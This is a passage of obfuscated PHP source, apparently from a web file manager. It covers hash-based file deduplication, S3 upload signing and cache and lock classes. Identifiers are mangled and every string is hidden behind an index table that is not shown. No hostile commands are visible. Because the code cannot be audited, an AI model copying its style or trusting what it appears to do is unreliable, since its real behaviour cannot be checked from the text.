IO::hashSimple($Î¼ÑœÅ×), $ø¶€ı[2039] => $ÍÅô¤¹¦ ? $ÍÅô¤¹¦ : $©°›¨Ì); if ($ëË‰®¥ = $this->addFileCheckExist($½³­ı…[$ø¶€ı[672]], $½³­ı…[$ø¶€ı[547]], $½³­ı…[$ø¶€ı[79]])) { return $ëË‰®¥; } return $this->addFileData($½³­ı…); } private function addFileData($Õ²º¨ìº) { $›Í–‰ÈÀ =& $_SERVER[¿ğÚ‰±–]; if (!$Õ²º¨ìº) { return !1; } $Õ²º¨ìº[$›Í–‰ÈÀ[79]] = intval($Õ²º¨ìº[$›Í–‰ÈÀ[79]]); if (!$Õ²º¨ìº[$›Í–‰ÈÀ[79]] && strlen($Õ²º¨ìº[$›Í–‰ÈÀ[672]]) > 32) { $Õ²º¨ìº[$›Í–‰ÈÀ[79]] = intval(substr($Õ²º¨ìº[$›Í–‰ÈÀ[672]], 32)); } $Ïí»åèø = $this->add($Õ²º¨ìº); return $this->find($Ïí»åèø); } public function addFile($‡‚¡¼µ±, $Êšı„Àò, $“Ñ†ä°Í = false) { $£¯ÅÀ£’ =& $_SERVER[¿ğÚ‰±–]; $Åã³’¸® = IO::hashSimple($‡‚¡¼µ±); $Şí…ş—ş = IO::size($‡‚¡¼µ±); $Ø¢Åò¹Á = $Şí…ş—ş <= 1024 * 1024 * 10 ? IO::hashMd5($‡‚¡¼µ±) : $£¯ÅÀ£’[12]; $ŒüŠÇÔ = $£¯ÅÀ£’[2040] . $Åã³’¸®; CacheLock::lock($ŒüŠÇÔ); if ($Ø¢Åò¹Á && $Åã³’¸®) { $Ì­•Šù = $this->addFileCheckExist($Åã³’¸®, $Ø¢Åò¹Á, $Şí…ş—ş); if ($Ì­•Šù) { CacheLock::unlock($ŒüŠÇÔ); return $Ì­•Šù; } } $Û—ò¦î£ = $this->addFileMake($‡‚¡¼µ±, $Şí…ş—ş, $Åã³’¸®, $Ø¢Åò¹Á, $Êšı„Àò, $“Ñ†ä°Í); $ö¢Æ© = $this->addFileData($Û—ò¦î£); CacheLock::unlock($ŒüŠÇÔ); if (!$Ø¢Åò¹Á && $ö¢Æ©) { $this->fileMd5Check($ö¢Æ©); } return $ö¢Æ©; } public function fileMd5Check($ô¤ÉÅœ±) { $ƒÂŒ”êÁ =& $_SERVER[¿ğÚ‰±–]; $ñ¿ïÉ°÷ = array($ô¤ÉÅœ±[$ƒÂŒ”êÁ[541]], $ô¤ÉÅœ±[$ƒÂŒ”êÁ[87]]); $¯›ÉàÀÔ = $ƒÂŒ”êÁ[2041] . $ô¤ÉÅœ±[$ƒÂŒ”êÁ[87]]; $¹ÃÁĞ¼º = $ƒÂŒ”êÁ[2042] . $ô¤ÉÅœ±[$ƒÂŒ”êÁ[541]]; TaskQueue::add($ƒÂŒ”êÁ[2043], $ñ¿ïÉ°÷, $¯›ÉàÀÔ, $¹ÃÁĞ¼º); } public function fileMd5Set($ñ’”´˜, $¤€Úï») { $Ú¦œ½İ£ =& $_SERVER[¿ğÚ‰±–]; $µ¾­óƒõ = $this->find($ñ’”´˜); if (!$µ¾­óƒõ || $µ¾­óƒõ[$Ú¦œ½İ£[547]]) { return; } $€£•“›Ò = IO::hashMd5($¤€Úï»); if (!$€£•“›Ò) { return $Ú¦œ½İ£[12]; } $this->where(array($Ú¦œ½İ£[541] => $ñ’”´˜))->save(array($Ú¦œ½İ£[547] => $€£•“›Ò)); } public function addFileMake($Ç”ëÈÉô, $ûÛÈ‹¸, $¤—ÏÊıä, $ò¦ë®º, $±¿ô‚ò­, $ÓÕ™¦ÂÕ) { $‰åĞÎ‘± =& $_SERVER[¿ğÚ‰±–]; $Ú†¿ˆ¡ı = $this->createFileName($±¿ô‚ò­, $¤—ÏÊıä, $ò¦ë®º); $ø”å‘²ß = get_path_father($Ú†¿ˆ¡ı); $¹÷ÚƒÔá = get_path_this($Ú†¿ˆ¡ı); if ($ÓÕ™¦ÂÕ) { $€œ÷×Á¨ = IO::move($Ç”ëÈÉô, $ø”å‘²ß, !1, $¹÷ÚƒÔá); } else { $€œ÷×Á¨ = IO::copy($Ç”ëÈÉô, $ø”å‘²ß, !1, $¹÷ÚƒÔá); } if (!$€œ÷×Á¨) { return !1; } $ˆÕ¬¦º = KodIO::defaultDriver(); $Û×ºôò  = array($‰åĞÎ‘±[617] => $ûÛÈ‹¸, $‰åĞÎ‘±[2037] => 1, $‰åĞÎ‘±[494] => $±¿ô‚ò­, $‰åĞÎ‘±[886] => $ˆÕ¬¦º[$‰åĞÎ‘±[475]], $‰åĞÎ‘±[495] => $Ú†¿ˆ¡ı, $‰åĞÎ‘±[2038] => $¤—ÏÊıä, $‰åĞÎ‘±[2039] => $ò¦ë®º); return $Û×ºôò ; } public function addFileCheckExist($®ö¨Ïæâ, $ßëÇÏŞ·, $†¤ÌâŠ•) { $¦ßçÃ‰Ø =& $_SERVER[¿ğÚ‰±–]; $ÎšˆƒÃØ = $this->findByHash($®ö¨Ïæâ, $ßëÇÏŞ·); if (!$ÎšˆƒÃØ) { return !1; } $ĞÚ¤’Ø = array($¦ßçÃ‰Ø[2037] => intval($ÎšˆƒÃØ[$¦ßçÃ‰Ø[2044]]) + 1, $¦ßçÃ‰Ø[617] => $†¤ÌâŠ•); $this->where(array($¦ßçÃ‰Ø[542] => $ÎšˆƒÃØ[$¦ßçÃ‰Ø[541]]))->save($ĞÚ¤’Ø); return $ÎšˆƒÃØ; } public function remove($…®¬ç ¿) { $this->linkCountChange($…®¬ç ¿, !1); $this->clearEmpty(); return !0; } public function linkAdd($ú‘¼Ç¿É) { $this->linkCountChange($ú‘¼Ç¿É, !0); } public function linkCountChange($¿£ù®›Å, $³²Û§Ä“) { $¸ğÊá¦Í =& $_SERVER[¿ğÚ‰±–]; if (!$¿£ù®›Å) { return; } if (!is_array($¿£ù®›Å)) { $¿£ù®›Å = array($¿£ù®›Å); } $¹ˆ—²š¤ = array(); foreach ($¿£ù®›Å as $Ëóş„) { $Õ÷º»—¾ = $Ëóş„ . $¸ğÊá¦Í[12]; if (!$¹ˆ—²š¤[$Õ÷º»—¾]) { $¹ˆ—²š¤[$Õ÷º»—¾] = 0; } $¹ˆ—²š¤[$Õ÷º»—¾]++; } $¸•‰£×ô = array(); foreach ($¹ˆ—²š¤ as $Ëóş„ => $®—åª®Å) { $Õ÷º»—¾ = $®—åª®Å . $¸ğÊá¦Í[12]; if (!$¸•‰£×ô[$Õ÷º»—¾]) { $¸•‰£×ô[$Õ÷º»—¾] = array(); } $¸•‰£×ô[$Õ÷º»—¾][] = $Ëóş„; } foreach ($¸•‰£×ô as $®—åª®Å => $ñøÚ¶ô“) { if (!$ñøÚ¶ô“) { continue; } $®—åª®Å = $³²Û§Ä“ ? $®—åª®Å : -intval($®—åª®Å); $²ô¹µï = array($¸ğÊá¦Í[541] => array($¸ğÊá¦Í[7], $ñøÚ¶ô“)); if ($®—åª®Å < 0) { $²ô¹µï[$¸ğÊá¦Í[2044]] = array($¸ğÊá¦Í[1100], abs($®—åª®Å)); } $this->where($²ô¹µï)->setAdd($¸ğÊá¦Í[2044], $®—åª®Å); } } public function findByHash($°Á ñ‘ú, $–è’ÆîÀ = false) { $À°ø¤ =& $_SERVER[¿ğÚ‰±–]; if (!$°Á ñ‘ú && !$–è’ÆîÀ) { return !1; } $İß¸ïœä = array($À°ø¤[2038] => $°Á ñ‘ú); if ($–è’ÆîÀ) { $İß¸ïœä = array($À°ø¤[2039] => $–è’ÆîÀ); } return $this->order($À°ø¤[2045])->where($İß¸ïœä)->find(); } public function clearEmpty($¬êªò§¥ = 0) { $ÓÄò¿¾ƒ =& $_SERVER[¿ğÚ‰±–]; $Î×ã€åÏ = time() - 3600 * 24 * $¬êªò§¥; $ÕÏ‘ûÒ© = $ÓÄò¿¾ƒ[2046] . $Î×ã€åÏ; $ï–‡À¾Æ = $this->where($ÕÏ‘ûÒ©)->select(); if (!$ï–‡À¾Æ) { return; } $ÉåÖé÷ = new Task($ÓÄò¿¾ƒ[2047], $ÓÄò¿¾ƒ[12], count($ï–‡À¾Æ)); foreach ($ï–‡À¾Æ as $¯¸ûà×) { $ÉåÖé÷->update(1); $this->resetFile($¯¸ûà×); } $ÉåÖé÷->end(); } public function resetFile($ÒåÆ) { $ÄïªÇÃ‰ =& $_SERVER[¿ğÚ‰±–]; $¶¤‘ª†® = array($ÄïªÇÃ‰[542] => $ÒåÆ[$ÄïªÇÃ‰[541]]); $ÔŸËï“ = Model($ÄïªÇÃ‰[1425])->where($¶¤‘ª†®)->count(); $ú¯ıŞ—Ğ = Model($ÄïªÇÃ‰[2048])->where($¶¤‘ª†®)->count(); $ÆĞ®öÈÙ = intval($ÔŸËï“) + intval($ú¯ıŞ—Ğ); if ($ÆĞ®öÈÙ == 0) { IO::remove($ÒåÆ[$ÄïªÇÃ‰[87]]); Model($ÄïªÇÃ‰[2049])->delete($ÒåÆ[$ÄïªÇÃ‰[541]]); $this->where($¶¤‘ª†®)->delete(); $this->metaSet($ÒåÆ[$ÄïªÇÃ‰[541]], null, null); write_log(ACTION . $ÄïªÇÃ‰[2050] . KodUser::id() . $ÄïªÇÃ‰[2051] . $ÒåÆ[$ÄïªÇÃ‰[541]] . $ÄïªÇÃ‰[2052] . $ÒåÆ[$ÄïªÇÃ‰[79]] . $ÄïªÇÃ‰[201] . $ÒåÆ[$ÄïªÇÃ‰[87]], $ÄïªÇÃ‰[2053]); return; } if ($ÒåÆ[$ÄïªÇÃ‰[2044]] != $ÆĞ®öÈÙ) { $this->where($¶¤‘ª†®)->save(array($ÄïªÇÃ‰[2037] => $ÆĞ®öÈÙ)); } } public function storageInfo($ÓÖùªÅ‰ = false) { $°±³ÉãÁ =& $_SERVER[¿ğÚ‰±–]; $–½¶Ë½ˆ = $this->count() + 0.0; $ã•ĞÚÚş = 0; $µİõ®·¯ = 1; $†Š‹Ê¢— = 0; $ÊÅ¸“›Â = 5000; for ($ë­´ñ’ = 0; $ë­´ñ’ < $–½¶Ë½ˆ; $ë­´ñ’ = $ë­´ñ’ + $ÊÅ¸“›Â) { $óÍ—Û = $this->limit($ë­´ñ’, $ë­´ñ’ + $ÊÅ¸“›Â)->select(); foreach ($óÍ—Û as $ÓÇ¤ğÉ³) { $µİõ®·¯ += $ÓÇ¤ğÉ³[$°±³ÉãÁ[79]] * $ÓÇ¤ğÉ³[$°±³ÉãÁ[2044]]; $ã•ĞÚÚş += $ÓÇ¤ğÉ³[$°±³ÉãÁ[79]] * ($ÓÇ¤ğÉ³[$°±³ÉãÁ[2044]] - 1); $†Š‹Ê¢— += $ÓÇ¤ğÉ³[$°±³ÉãÁ[2044]]; } } $ ÔÂ§‡Œ = array($°±³ÉãÁ[2054] => $µİõ®·¯, $°±³ÉãÁ[2055] => $ã•ĞÚÚş, $°±³ÉãÁ[2056] => $ã•ĞÚÚş / $µİõ®·¯, $°±³ÉãÁ[83] => $–½¶Ë½ˆ, $°±³ÉãÁ[2057] => $†Š‹Ê¢—); return $ ÔÂ§‡Œ; } } goto EŠèªÖàšÓ; d©©ï™¼ó•: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($‰ĞÈš÷Ç) { parent::__construct($‰ĞÈš÷Ç); } public function uploadFormData($Ò«á§Ü, $½çêÏí“ = 3600) { $óœ·±Ì =& $_SERVER[¿ğÚ‰±–]; $Ò§ÅöŒ£ = $óœ·±Ì[229]; $ê‰‚è·Ñ = $óœ·±Ì[270]; $…éª“ìü = $óœ·±Ì[62]; $ëÚÔûÍò = gmdate($óœ·±Ì[271]); $©©Ÿ×ê£ = gmdate($óœ·±Ì[272]); $¢¥Ñ€³ = $óœ·±Ì[273]; $ë”éÕÔ = $½çêÏí“ . $óœ·±Ì[12]; $ÎğˆğÎ = $óœ·±Ì[274]; $ã¸ç¹×ì = array($this->accessKey, $©©Ÿ×ê£, $this->region, $…éª“ìü, $¢¥Ñ€³); $ ÑóÏˆŒ = implode($óœ·±Ì[8], $ã¸ç¹×ì); $÷¼ªãòî = array($óœ·±Ì[275] => gmdate($óœ·±Ì[299], strtotime($óœ·±Ì[277])), $óœ·±Ì[278] => array(array($óœ·±Ì[279] => $this->bucket), array($óœ·±Ì[280] => $Ò§ÅöŒ£), array($óœ·±Ì[281], $óœ·±Ì[282], $óœ·±Ì[12]), array($óœ·±Ì[281], $óœ·±Ì[283], $óœ·±Ì[12]), array($óœ·±Ì[281], $óœ·±Ì[284], $óœ·±Ì[12]), array($óœ·±Ì[285] => $ÎğˆğÎ), array($óœ·±Ì[286] => $ ÑóÏˆŒ), array($óœ·±Ì[287] => $ê‰‚è·Ñ), array($óœ·±Ì[288] => $ëÚÔûÍò), array($óœ·±Ì[289] => $ë”éÕÔ))); $ôíÃï†è = base64_encode(json_encode($÷¼ªãòî)); $·®Šñ‡ô = hash_hmac($óœ·±Ì[290], $©©Ÿ×ê£, $óœ·±Ì[291] . $this->secret, !0); $¡ã²‰¿Å = hash_hmac($óœ·±Ì[290], $this->region, $·®Šñ‡ô, !0); $­ËÙ‡–´ = hash_hmac($óœ·±Ì[290], $…éª“ìü, $¡ã²‰¿Å, !0); $şäÛò³” = hash_hmac($óœ·±Ì[290], $¢¥Ñ€³, $­ËÙ‡–´, !0); $èË‡Ï‚Á = hash_hmac($óœ·±Ì[290], $ôíÃï†è, $şäÛò³”); $è½„î = array($óœ·±Ì[246] => $óœ·±Ì[12], $óœ·±Ì[292] => $óœ·±Ì[12], $óœ·±Ì[280] => $Ò§ÅöŒ£, $óœ·±Ì[285] => $ÎğˆğÎ, $óœ·±Ì[293] => $ôíÃï†è, $óœ·±Ì[294] => $ ÑóÏˆŒ, $óœ·±Ì[295] => $ê‰‚è·Ñ, $óœ·±Ì[296] => $ëÚÔûÍò, $óœ·±Ì[297] => $ë”éÕÔ, $óœ·±Ì[298] => $èË‡Ï‚Á, $óœ·±Ì[208] => $this->getHost()); return $è½„î; } public function multiUploadFormData($æÌœô¯ù, $¹¦“Ÿú = 3600) { $–¬â Òæ =& $_SERVER[¿ğÚ‰±–]; $¿¯¾ÜÖ¾ = gmdate($–¬â Òæ[300]); $„‡á’•Ò = array(); $›„œ®˜ = $this->client->getUploadId($this->bucket, $æÌœô¯ù, $„‡á’•Ò); if (!$›„œ®˜) { return !1; } return array($–¬â Òæ[254] => $›„œ®˜, $–¬â Òæ[208] => $this->getHost() . $–¬â Òæ[8] . $this->pathEncode($æÌœô¯ù), $–¬â Òæ[255] => $¿¯¾ÜÖ¾, $–¬â Òæ[97] => $æÌœô¯ù); } public function multiUploadAuthData($úÃ†å¸ã, $•¦Ëæóó = array()) { $ˆğ˜¡«Ó =& $_SERVER[¿ğÚ‰±–]; $éÕ‡ãùö = isset($•¦Ëæóó[$ˆğ˜¡«Ó[169]]) ? $•¦Ëæóó[$ˆğ˜¡«Ó[169]] : $ˆğ˜¡«Ó[12]; $ìøáşé„ = $•¦Ëæóó[$ˆğ˜¡«Ó[97]]; unset($•¦Ëæóó[$ˆğ˜¡«Ó[97]]); if (isset($•¦Ëæóó[$ˆğ˜¡«Ó[256]])) { return $this->listUploadParts($ìøáşé„, $•¦Ëæóó); } $èŒ‰¥û¶ = array(); if (isset($•¦Ëæóó[$ˆğ˜¡«Ó[301]])) { $èŒ‰¥û¶[$ˆğ˜¡«Ó[302]] = $•¦Ëæóó[$ˆğ˜¡«Ó[301]]; } $ÇøÛÒÍ† = explode($ˆğ˜¡«Ó[210], $this->getHost()); $¤ÍñšØó = array($ˆğ˜¡«Ó[303] => $ÇøÛÒÍ†[1], $ˆğ˜¡«Ó[304] => $ˆğ˜¡«Ó[12], $ˆğ˜¡«Ó[246] => $ˆğ˜¡«Ó[123], $ˆğ˜¡«Ó[292] => $•¦Ëæóó[$ˆğ˜¡«Ó[79]]); $ûÛĞ†ë = $ˆğ˜¡«Ó[259]; $„ç¦‚ïå = $ˆğ˜¡«Ó[8] . $this->pathEncode($ìøáşé„) . $éÕ‡ãùö; $Ò†Ó¯×Ä = $this->client->__getSignatureV4($èŒ‰¥û¶, $¤ÍñšØó, $ûÛĞ†ë, $„ç¦‚ïå); if (strpos($éÕ‡ãùö, $ˆğ˜¡«Ó[258]) === 0) { if (isset($èŒ‰¥û¶[$ˆğ˜¡«Ó[302]])) { $†à¤æå» = $èŒ‰¥û¶[$ˆğ˜¡«Ó[302]]; } else { if (isset($Ò†Ó¯×Ä[$ˆğ˜¡«Ó[302]])) { $†à¤æå» = $Ò†Ó¯×Ä[$ˆğ˜¡«Ó[302]]; } else { $†à¤æå» = hash($ˆğ˜¡«Ó[290], $ˆğ˜¡«Ó[12]); } } return array($ˆğ˜¡«Ó[265] => $Ò†Ó¯×Ä[$ˆğ˜¡«Ó[265]], $ˆğ˜¡«Ó[302] => $†à¤æå», $ˆğ˜¡«Ó[255] => $Ò†Ó¯×Ä[$ˆğ˜¡«Ó[305]]); } return $Ò†Ó¯×Ä[$ˆğ˜¡«Ó[265]]; } public function listUploadParts($·Íı¹’§, $•ô½ÓïÎ = array()) { $¾§”å” =& $_SERVER[¿ğÚ‰±–]; $¥€Ô‘ó = str_replace($¾§”å”[266], $¾§”å”[12], $•ô½ÓïÎ[$¾§”å”[169]]); $€õó†ãñ = $this->client->listParts($this->bucket, $·Íı¹’§, $¥€Ô‘ó); if (!$€õó†ãñ) { return !1; } $æÖ±³Â” = $¾§”å”[306]; foreach ($€õó†ãñ as $°ÂÍ–ºì) { $æÖ±³Â” .= $¾§”å”[307] . "\74\x50\x61\162\x74\x4e\165\x6d\142\145\162\x3e{$°ÂÍ–ºì[$¾§”å”[308]]}\x3c\57\x50\x61\162\164\x4e\165\155\142\x65\162\76\xa" . "\74\105\x54\141\x67\76{$°ÂÍ–ºì[$¾§”å”[309]]}\x3c\57\x45\124\x61\147\x3e\12" . $¾§”å”[310]; } $æÖ±³Â” .= $¾§”å”[311]; $•ÒÊóÎ = array(); $°ñù®Şê = explode($¾§”å”[210], $this->getHost()); $À¡à”£Â = array($¾§”å”[303] => $°ñù®Şê[1], $¾§”å”[246] => $¾§”å”[123], $¾§”å”[292] => strlen($æÖ±³Â”)); $Ö¸å¡™» = $¾§”å”[257]; $—ëñÂ—’ = $¾§”å”[8] . $this->pathEncode($·Íı¹’§) . $•ô½ÓïÎ[$¾§”å”[169]]; $‰øšö¼ = $this->client->__getSignatureV4($•ÒÊóÎ, $À¡à”£Â, $Ö¸å¡™», $—ëñÂ—’, $æÖ±³Â”); return array($¾§”å”[265] => $‰øšö¼[$¾§”å”[265]], $¾§”å”[255] => $‰øšö¼[$¾§”å”[305]], $¾§”å”[267] => $€õó†ãñ, $¾§”å”[302] => $‰øšö¼[$¾§”å”[302]]); } public function link($×¬ŸÏÕ, $Àôû–äµ = array()) { return parent::link($×¬ŸÏÕ, $Àôû–äµ); } public function fileOut($±¡µôçØ, $ÙÀÚÅ´Ó = false, $ßÚ‰Î„Ğ = false, $ƒş”¼ô¿ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¿ğÚ‰±–][312])) { return parent::fileOutServer($±¡µôçØ, $ÙÀÚÅ´Ó, $ßÚ‰Î„Ğ, $ƒş”¼ô¿); } parent::fileOut($±¡µôçØ, $ÙÀÚÅ´Ó, $ßÚ‰Î„Ğ, $ƒş”¼ô¿); } public function fileOutImage($šéŒôÔ, $áƒ¢ôä« = 250) { if (strstr($this->endpoint, $_SERVER[¿ğÚ‰±–][312])) { return parent::fileOutImageServer($šéŒôÔ, $áƒ¢ôä«); } parent::fileOutImage($šéŒôÔ, $áƒ¢ôä«); } public function fileOutLink($ÁÆóæÁö) { $¾†„£Ü =& $_SERVER[¿ğÚ‰±–]; if (substr($ÁÆóæÁö, 0, 7) == $¾†„£Ü[313]) { $ÁÆóæÁö = $¾†„£Ü[314] . substr($ÁÆóæÁö, 7); } header($¾†„£Ü[175] . $ÁÆóæÁö); die; } } define($_SERVER[¿ğÚ‰±–][315], 1); define($_SERVER[¿ğÚ‰±–][316], 2); goto Cˆ¬¿õİ¯Œ; C¾Ù‡ïÛ©Æ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $è™ì™· =& $_SERVER[¿ğÚ‰±–]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ô£Ã‹©œ = $GLOBALS[$è™ì™·[6]][$è™ì™·[425]]; $õ‡åº¸° = $Ô£Ã‹©œ[$Ô£Ã‹©œ[$è™ì™·[904]]]; $ìôÎ‡°ù = $Ô£Ã‹©œ[$è™ì™·[905]]; switch ($Ô£Ã‹©œ[$è™ì™·[904]]) { case $è™ì™·[21]: self::$handle = Model($è™ì™·[906]); break; case $è™ì™·[907]: self::$handle = new CacheRedis($õ‡åº¸°, $ìôÎ‡°ù); break; case $è™ì™·[908]: self::$handle = new CacheMemcached($õ‡åº¸°, $ìôÎ‡°ù); break; case $è™ì™·[230]: self::$handle = new CacheFile($õ‡åº¸°, $ìôÎ‡°ù); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ú¡€§‰Ö) { if (is_array($ú¡€§‰Ö) || is_object($ú¡€§‰Ö)) { $ú¡€§‰Ö = json_encode($ú¡€§‰Ö); } $ú¡€§‰Ö = rawurlencode($ú¡€§‰Ö); return md5(KOD_SITE_ID . $_SERVER[¿ğÚ‰±–][11] . $ú¡€§‰Ö); } public static function get($ºã¾ªº, $¹»ø…¹ã = false) { $¡ëøêÑ› = self::key($ºã¾ªº); $à¦Àıˆñ = self::init(); if ($¹»ø…¹ã) { return unserialize($à¦Àıˆñ->get($¡ëøêÑ›)); } if (!isset(self::$memoryCache[$¡ëøêÑ›])) { $°ŠØÆ¦à = $à¦Àıˆñ->get($¡ëøêÑ›); self::$memoryCache[$¡ëøêÑ›] = unserialize($°ŠØÆ¦à); } return self::$memoryCache[$¡ëøêÑ›]; } public static function set($Ã ŒÜ‰—, $®÷É†ì, $Œ×øêõ = false) { $½ÒÜÂºÙ =& $_SERVER[¿ğÚ‰±–]; $š™³šŒ = self::key($Ã ŒÜ‰—); if (isset(self::$memoryCache[$š™³šŒ]) && self::$memoryCache[$š™³šŒ] === $®÷É†ì) { return !0; } if ($Œ×øêõ === 0) { self::$memoryCache[$š™³šŒ] = $®÷É†ì; return !0; } $çñ‚›³– = self::init(); $É“†±Î” = serialize($®÷É†ì); CacheLock::lock($Ã ŒÜ‰— . $½ÒÜÂºÙ[909]); $ªĞ¿Ä¡ = $çñ‚›³–->set($š™³šŒ, $É“†±Î”, $Œ×øêõ); self::$memoryCache[$š™³šŒ] = $®÷É†ì; CacheLock::unlock($Ã ŒÜ‰— . $½ÒÜÂºÙ[909]); return $ªĞ¿Ä¡; } public static function getCall($åÖï¸å—, $¯©Í÷Í¬, $áÔ–ßëÀ, $‹µâßàİ = array()) { $šİ‹èëË =& $_SERVER[¿ğÚ‰±–]; $ıœ½È…  = self::get($åÖï¸å—); if ($ıœ½È…  || $ıœ½È…  === $šİ‹èëË[12]) { return $ıœ½È… ; } $ıœ½È…  = call_user_func_array($áÔ–ßëÀ, $‹µâßàİ); $ıœ½È…  = $ıœ½È…  ? $ıœ½È…  : $šİ‹èëË[12]; self::set($åÖï¸å—, $ıœ½È… , $¯©Í÷Í¬); return $ıœ½È… ; } public static function remove($Ìò¼¡š¦) { $¬´Ë³Ùí = self::key($Ìò¼¡š¦); unset(self::$memoryCache[$¬´Ë³Ùí]); self::clearTimeout(); CacheLock::lock($Ìò¼¡š¦); $Š­Ğá´¦ = self::init()->remove($¬´Ë³Ùí); CacheLock::unlock($Ìò¼¡š¦); return $Š­Ğá´¦; } public static function removeMemory($ğ€ŒÑ™õ) { $½çÕä“ = self::key($ğ€ŒÑ™õ); unset(self::$memoryCache[$½çÕä“]); } public static function clearMemory($´¿Ôãªí = false) { if ($´¿Ôãªí) { $´¿Ôãªí = self::key($´¿Ôãªí); unset(self::$memoryCache[$´¿Ôãªí]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¿ğÚ‰±–][910])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¿ğÚ‰±–][911])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($§¹ëÌë¼, $ì‘§â‡Ë) { $È–Ü¤–® =& $_SERVER[¿ğÚ‰±–]; $this->cachePath = $§¹ëÌë¼[$È–Ü¤–®[87]]; $this->prefix = $È–Ü¤–®[912]; $this->cacheTime = $ì‘§â‡Ë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ò…¬¥ğå) { $ó¾·‚Ü =& $_SERVER[¿ğÚ‰±–]; $Ò…¬¥ğå = str_replace(array($ó¾·‚Ü[913], $ó¾·‚Ü[100], $ó¾·‚Ü[76]), $ó¾·‚Ü[914], $Ò…¬¥ğå); return $this->cachePath . $ó¾·‚Ü[915] . $Ò…¬¥ğå . $ó¾·‚Ü[916]; } public function set($æ’±è…õ, $êçû§ÙÂ, $ŠîÍ»öò = false) { $ŠîÍ»öò = $ŠîÍ»öò ? $ŠîÍ»öò : $this->cacheTime; $îá«Ù  = $this->getFile($æ’±è…õ); if (file_put_contents($îá«Ù , $this->prefix . $êçû§ÙÂ, LOCK_EX)) { @touch($îá«Ù , intval(time() + $ŠîÍ»öò)); clearstatcache(); return !0; } @unlink($îá«Ù ); return !1; } public function get($ÅàÇ¬Ê«) { $›èÈ¶ª“ = $this->getFile($ÅàÇ¬Ê«); if (file_exists($›èÈ¶ª“) && filemtime($›èÈ¶ª“) < time()) { @unlink($›èÈ¶ª“); return !1; } $ÎÑÈö¶¶ = @file_get_contents($›èÈ¶ª“); return substr($ÎÑÈö¶¶, strlen($this->prefix)); } public function remove($ÙĞœÖä) { $œÃ¾ä = $this->getFile($ÙĞœÖä); return @unlink($œÃ¾ä); } public function deleteAll() { $˜“½úşœ =& $_SERVER[¿ğÚ‰±–]; $şÛé×ÜÏ = scandir($this->cachePath); foreach ($şÛé×ÜÏ as $Ò²Ÿññ„) { $¶»ß˜Èª = $this->cachePath . $Ò²Ÿññ„; if (strpos($¶»ß˜Èª, $˜“½úşœ[916]) && strpos($¶»ß˜Èª, $˜“½úşœ[917])) { @unlink($¶»ß˜Èª); } } } public function clearTimeout() { $ÌËÇ±õ¿ =& $_SERVER[¿ğÚ‰±–]; $»ò“Û›Õ = scandir($this->cachePath); foreach ($»ò“Û›Õ as $•ŒÆı‰í) { $Ëã¨«ì« = $this->cachePath . $•ŒÆı‰í; if (strpos($Ëã¨«ì«, $ÌËÇ±õ¿[916]) && strpos($Ëã¨«ì«, $ÌËÇ±õ¿[917]) && filemtime($Ëã¨«ì«) < time()) { @unlink($Ëã¨«ì«); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ëÃ«Êêà =& $_SERVER[¿ğÚ‰±–]; if (self::$handle) { return self::$handle; } $³ç£ÜîÎ = $GLOBALS[$ëÃ«Êêà[6]][$ëÃ«Êêà[425]]; self::$timeout = $³ç£ÜîÎ[$ëÃ«Êêà[918]] ? $³ç£ÜîÎ[$ëÃ«Êêà[918]] : 10; $Š€ŸÒ‡ş = _get($GLOBALS[$ëÃ«Êêà[6]], $ëÃ«Êêà[919]); $½»ŠÁÒò = $³ç£ÜîÎ[$ëÃ«Êêà[904]] ? $³ç£ÜîÎ[$ëÃ«Êêà[904]] : $ëÃ«Êêà[230]; if ($½»ŠÁÒò == $ëÃ«Êêà[21] && $Š€ŸÒ‡ş == $ëÃ«Êêà[13]) { $½»ŠÁÒò = $ëÃ«Êêà[230]; } switch ($½»ŠÁÒò) { case $ëÃ«Êêà[907]: self::$handle = new CacheLockRedis(); break; case $ëÃ«Êêà[908]: self::$handle = new CacheLockMemcached(); break; case $ëÃ«Êêà[21]: self::$handle = new CacheLockDatabase(); break; case $ëÃ«Êêà[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ëÃ«Êêà[920], $ëÃ«Êêà[921]); } return self::$handle; } private static function key($‚¯­¸Ã–) { return $_SERVER[¿ğÚ‰±–][922] . Cache::key($‚¯­¸Ã–); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($–ñ’Æ³Í = '') { self::$errorMsg = $–ñ’Æ³Í; } public static function lockGlobal($€’Õöªè, $ÙƒùÆ²Ë) { return self::lock($€’Õöªè, $ÙƒùÆ²Ë, !0); } public static function lock($ÙãêôŒç, $¸ÑÂäºò = false, $Šßè§ñ† = false) { $¬ç¥Çè =& $_SERVER[¿ğÚ‰±–]; $€àèÚáŞ = self::init(); $ â±Ï¯º = self::key($ÙãêôŒç); $¸ÑÂäºò = $¸ÑÂäºò ? $¸ÑÂäºò : self::$timeout; $˜ßøÕ¥… = timeFloat(); $ú éğ·å = $€àèÚáŞ->lock($ â±Ï¯º, $¸ÑÂäºò); $ñÂƒ…²¼ = timeFloat(); if (!$ú éğ·å) { $ÙŒÌÕÀŒ = "\154\157\x63\x6b\x20\145\x72\x72\x6f\162\73\153\145\171\75{$ÙãêôŒç}\73\x74\x69\x6d\145\75{$¸ÑÂäºò}\73" . self::$errorMsg . $¬ç¥Çè[74] . get_caller_msg(); $©Şç›ƒ = LNG($¬ç¥Çè[923]) . "\x28{$¸ÑÂäºò}\x73\51\56" . LNG($¬ç¥Çè[924]); $©Şç›ƒ .= $¬ç¥Çè[925]; if (is_string(self::$errorMsg) && self::$errorMsg) { $©Şç›ƒ = $©Şç›ƒ . $¬ç¥Çè[926] . self::$errorMsg; } write_log($¬ç¥Çè[927] . sprintf($¬ç¥Çè[928], timeFloat() - 